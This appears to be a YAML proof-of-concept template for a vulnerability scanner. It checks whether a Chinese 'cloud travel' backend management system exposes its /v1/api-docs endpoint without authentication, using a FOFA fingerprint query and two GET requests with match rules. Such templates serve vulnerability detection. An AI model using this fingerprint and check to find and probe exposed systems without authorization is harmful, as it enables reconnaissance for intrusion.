id: poc-yaml-cloud-travel-bms-api-docs-unauthorized-access
info:
  name: 云出行后台管理系统 api-docs 未授权访问漏洞
  severity: medium
  tags:
  - 未授权访问
  finger: 云出行后台管理系统
  fofa: body="云出行后台管理系统"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(title,"云出行后台管理系统")
- method: GET
  path: /v1/api-docs
  expression: status_code == 200 && contains(body,"\"description\":") && matches(body,"\"operationId\"\x3a
    \"([0-9a-zA-Z-]+)\"") && contains(body,"\"description\"\x3a \"Success\"") && contains(content_type,"application/json")
variables: {}
transport: http
